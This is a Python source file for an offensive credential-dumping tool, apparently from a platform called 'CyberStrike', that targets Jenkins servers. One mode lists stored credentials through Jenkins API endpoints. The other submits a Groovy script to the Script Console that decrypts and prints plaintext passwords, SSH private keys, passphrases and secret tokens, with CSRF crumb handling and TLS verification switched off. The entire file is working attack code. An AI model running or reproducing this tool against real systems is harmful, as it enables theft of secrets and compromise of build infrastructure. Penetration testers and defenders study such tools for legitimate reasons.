#!/usr/bin/env python3
"""
jenkins_creds.py — Jenkins Credential Extraction

Dumps credentials from Jenkins via the API or Groovy Script Console.
Extracts passwords, SSH keys, and other stored secrets.

Part of CyberStrike offensive security platform.
"""

import argparse
import json
import os
import signal
import sys
import time
from datetime import datetime

try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError:
    print("ERROR: requests required. Install: pip3 install requests", file=sys.stderr)
    sys.exit(1)


class JenkinsCreds:
    def __init__(self, args):
        self.args = args
        self.event_count = 0
        self.start_time = None
        self.running = True
        self.auth = None
        if args.user and args.token:
            self.auth = HTTPBasicAuth(args.user, args.token)
        elif os.environ.get("JENKINS_USER") and os.environ.get("JENKINS_TOKEN"):
            self.auth = HTTPBasicAuth(os.environ["JENKINS_USER"], os.environ["JENKINS_TOKEN"])

    def signal_handler(self, signum, frame):
        self.running = False

    def print_banner(self):
        print("=" * 70)
        print("CyberStrike — Jenkins Credential Dump")
        print("=" * 70)
        print(f"PID:       {os.getpid()}")
        print(f"URL:       {self.args.url}")
        print(f"Method:    {self.args.method}")
        print(f"Auth:      {'set' if self.auth else 'NOT SET'}")
        print(f"Output:    {'JSON' if self.args.json_output else 'text'}")
        print(f"Started:   {datetime.now().isoformat()}")
        print("=" * 70)
        print()

    def emit(self, record):
        self.event_count += 1
        if self.args.json_output:
            print(json.dumps(record, default=str), flush=True)
        else:
            action = record.get("action", "info")
            status = record.get("status", "")
            detail = record.get("detail", "")
            print(f"[{action.upper():<14}] [{status.upper():<8}] {detail}", flush=True)
            if record.get("value"):
                val = record["value"]
                if len(str(val)) > 100:
                    val = str(val)[:100] + "..."
                print(f"  -> value: {val}", flush=True)

    def method_api(self):
        url = self.args.url.rstrip("/")

        r = requests.get(f"{url}/credentials/store/system/domain/_/api/json?depth=2", auth=self.auth, timeout=30, verify=False)
        if r.status_code == 200:
            data = r.json()
            for cred in data.get("credentials", []):
                self.emit({
                    "action": "credential",
                    "status": "found",
                    "detail": f"{cred.get('id', 'N/A')}: {cred.get('description', 'N/A')} (type: {cred.get('typeName', 'N/A')})",
                    "id": cred.get("id"),
                    "description": cred.get("description"),
                    "type": cred.get("typeName"),
                    "display_name": cred.get("displayName"),
                    "scope": cred.get("scope"),
                })
        else:
            self.emit({"action": "api", "status": "failed", "detail": f"HTTP {r.status_code}"})

        folders_r = requests.get(f"{url}/credentials/api/json?depth=3", auth=self.auth, timeout=30, verify=False)
        if folders_r.status_code == 200:
            stores = folders_r.json().get("stores", {})
            for store_name, store_data in stores.items():
                domains = store_data.get("domains", {})
                for domain_name, domain_data in domains.items():
                    for cred in domain_data.get("credentials", []):
                        if not self.running:
                            break
                        self.emit({
                            "action": "credential",
                            "status": "found",
                            "detail": f"[{store_name}/{domain_name}] {cred.get('id', 'N/A')}: {cred.get('typeName', 'N/A')}",
                            "store": store_name,
                            "domain": domain_name,
                            "id": cred.get("id"),
                            "type": cred.get("typeName"),
                            "description": cred.get("description"),
                        })

    def method_console(self):
        url = self.args.url.rstrip("/")

        groovy_script = """
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
import org.jenkinsci.plugins.plaincredentials.impl.*

def creds = CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.Credentials.class,
    Jenkins.instance,
    null,
    null
)

creds.each { c ->
    def result = [id: c.id, description: c.description, type: c.class.name]

    if (c instanceof UsernamePasswordCredentialsImpl) {
        result.username = c.username
        result.password = c.password?.plainText
    } else if (c instanceof BasicSSHUserPrivateKey) {
        result.username = c.username
        result.privateKey = c.privateKey
        result.passphrase = c.passphrase?.plainText
    } else if (c instanceof StringCredentialsImpl) {
        result.secret = c.secret?.plainText
    } else if (c instanceof FileCredentialsImpl) {
        result.fileName = c.fileName
    }

    println("CS_CRED_JSON:" + groovy.json.JsonOutput.toJson(result))
}
"""

        crumb_r = requests.get(f"{url}/crumbIssuer/api/json", auth=self.auth, timeout=10, verify=False)
        crumb_header = {}
        if crumb_r.status_code == 200:
            crumb_data = crumb_r.json()
            crumb_header = {crumb_data["crumbRequestField"]: crumb_data["crumb"]}

        r = requests.post(
            f"{url}/scriptText",
            auth=self.auth,
            headers=crumb_header,
            data={"script": groovy_script},
            timeout=30,
            verify=False,
        )

        if r.status_code != 200:
            self.emit({"action": "console", "status": "failed", "detail": f"Script console: HTTP {r.status_code}"})
            return

        for line in r.text.splitlines():
            if not self.running:
                break
            if line.startswith("CS_CRED_JSON:"):
                try:
                    cred = json.loads(line[len("CS_CRED_JSON:"):])
                    self.emit({
                        "action": "credential",
                        "status": "extracted",
                        "detail": f"{cred.get('id', 'N/A')}: {cred.get('type', 'N/A')}",
                        "id": cred.get("id"),
                        "type": cred.get("type"),
                        "description": cred.get("description"),
                        "username": cred.get("username"),
                        "value": cred.get("password") or cred.get("secret") or cred.get("privateKey"),
                    })
                except json.JSONDecodeError:
                    pass

    def run(self):
        self.print_banner()

        if not self.auth:
            print("ERROR: Jenkins auth required. Set --user/--token or JENKINS_USER/JENKINS_TOKEN.", file=sys.stderr)
            sys.exit(1)

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self.start_time = time.monotonic()

        methods = {
            "api": self.method_api,
            "console": self.method_console,
        }

        method_fn = methods.get(self.args.method)
        if not method_fn:
            print(f"ERROR: Unknown method '{self.args.method}'. Available: {', '.join(methods.keys())}", file=sys.stderr)
            sys.exit(1)

        method_fn()
        self.cleanup()

    def cleanup(self):
        print(f"\n--- jenkins_creds summary ---")
        print(f"Method: {self.args.method}")
        print(f"Records: {self.event_count}")
        if self.start_time:
            print(f"Duration: {time.monotonic() - self.start_time:.1f}s")
        print("Done.")


def main():
    parser = argparse.ArgumentParser(
        description="Extract credentials from Jenkins via API or Groovy Script Console.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 jenkins_creds.py --url http://jenkins:8080 --method api --user admin --token TOKEN\n"
            "  python3 jenkins_creds.py --url http://jenkins:8080 --method console --json-output\n"
        ),
    )
    parser.add_argument("--url", type=str, required=True, help="Jenkins URL")
    parser.add_argument("--method", type=str, default="api", help="Method: api|console")
    parser.add_argument("--user", type=str, default=None, help="Jenkins username")
    parser.add_argument("--token", type=str, default=None, help="Jenkins API token")
    parser.add_argument("--json-output", action="store_true", default=False, help="Output as JSON lines")
    args = parser.parse_args()

    tool = JenkinsCreds(args)
    tool.run()


if __name__ == "__main__":
    main()
